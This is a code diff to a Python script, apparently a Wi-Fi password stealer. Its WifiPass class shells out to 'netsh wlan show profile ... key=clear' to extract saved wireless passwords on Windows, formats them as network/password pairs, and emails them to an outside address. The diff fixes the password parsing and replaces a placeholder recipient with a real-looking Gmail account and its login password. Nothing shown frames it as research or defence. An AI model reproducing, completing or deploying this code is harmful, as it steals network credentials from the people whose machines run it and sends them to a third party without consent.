@@ -14,19 +14,19 @@ class WifiPass:
             
         for network in network_names:
             pass_cmd_op = subprocess.check_output( f"netsh wlan show profile \"{network}\" key=clear" ,shell=True)
-            pass_search = re.search("(?:Key Content\s*:\s*)(.*)", pass_cmd_op.decode())
+            pass_search = re.search("(?:Key Content\s*:\s*)(.*)", pass_cmd_op.decode()).group(1)
             pass_list.append(pass_search)
         return pass_list
 
     #function to format result nicely
     def formatting_result(self,network_name, its_password):
-        dev_list = []
-        for number in range(len(network_name)):
-            dev_pass = network_name[number].strip()+":"+its_password[number].group(1).strip()
-            dev_list.append(dev_pass)
-        proper_format="\n".join(dev_list)
-        return proper_format
-
+        dev_list = ""
+        for num in range(len(network_name)):
+            # net = network_name[num]
+            # passwd = its_password[num]
+            string = f'{network_name[num]}\t\t\t{its_password[num]}'
+            dev_list = dev_list + "\n" + string
+        return dev_list
     #main execution of program
     def execute(self):
         networks = self.network_search()
@@ -44,4 +44,5 @@ def send_email(email,password,message):
     server.quit()
 
 msg = WifiPass().execute()
-send_email("youremail@email.com","pass",msg)
+
+send_email("forkeylogger101@gmail.com","loggerkey101",msg)
